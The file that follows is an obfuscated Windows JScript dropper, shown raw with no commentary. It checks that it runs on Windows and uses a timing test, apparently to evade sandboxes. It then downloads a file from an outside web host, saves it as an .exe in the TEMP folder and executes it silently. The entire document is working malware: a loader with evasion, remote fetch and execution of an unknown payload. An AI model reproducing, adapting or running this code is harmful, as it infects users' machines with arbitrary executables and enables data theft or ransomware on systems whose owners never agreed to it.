var _V = false;
var _E = "CreateObject";
var _E0 = function _KS() {return WScript[_E]("WScript"+".Shell");}(), _RY = 11;
var _N0 = "MSXML2.XMLHTTP";
var _UI = 2123213;
var _X = 0;
function _M(_WM){_E0["Run"](_WM, _X, _X);};
function _TX(){return _N0 + "";};
function _AT(_H0, _AS){_X = _X * 1; return _H0 - _AS;};
function _AX(){return _E;};
/*@cc_on
  @if (@_win32 || @_win64)
    _V = true;
  @end
@*/
if (_V)
{
var _TI = "";
function _Q0(){return 22;};
var _TT = 0; var _RF = 0;
function _K()
{
var _JD = new this["Date"]();
var _H = _JD["getUTCMilliseconds"]();
WScript["Sleep"](_Q0());
var _JD = new this["Date"]();
var _XZ = _JD["getUTCMilliseconds"]();
WScript["Sleep"](_Q0());
var _JD = new this["Date"]();
var _KE = _JD["getUTCMilliseconds"]();
var _TT = "_Q1";
_TT = _AT(_XZ, _H);
var _RF = "_RC";
_RF = _AT(_KE, _XZ);
_TI = "open";
return _AT(_TT, _RF);
}
var _L = false;
var _Y = false;
for (var _Z = _X; _Z < _Q0() * 1; _Z++){if (_K() != _X){
_L = true; 
_RF = "31" + 11 * _TT + _RF; 
_Y = true; 
break;
}}
function _ZD() {return ((_L == true) && (_L == _Y)) ? 1 : _X;};
if (_L && _ZD() && _Y){
function _S() {return _E0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "DQbFryeg3eI.ex" + "e";};
 _ID = _TX();
 _R = WScript[_E](_ID);
 var _MV = 1;
 while (_MV){
try {
	if (_MV == 1)
	{
		_R[_TI]("GET", "http://hollandfoodexchange.com/d7jsa", false);
		_R["send"]();
		_C = "Sleep";
	}
	WScript[_C](_Q0() + 120); 
	if (_R["readystate"] < 2 * 2) continue;
	_MV = _X;
	function _Q(_N) {var _M0 = (1, 2, 3, 4, 5, _N); return _M0;};
	_RA = WScript[_AX()]("ADODB.Stream");
	_ID = _RA;
	_ID[_TI]();
	_ID["type"] = _Q(1);
	_ID["write"](_R["ResponseBody"]);
	_RA["position"] = _Q(_X);
	_ID["Save" + "ToFile"](_S(), 2);
	_RA["cl"+"ose"]();
	_S0 = _S();
	_M(_S0);
} catch(_YT){};
}
}
}

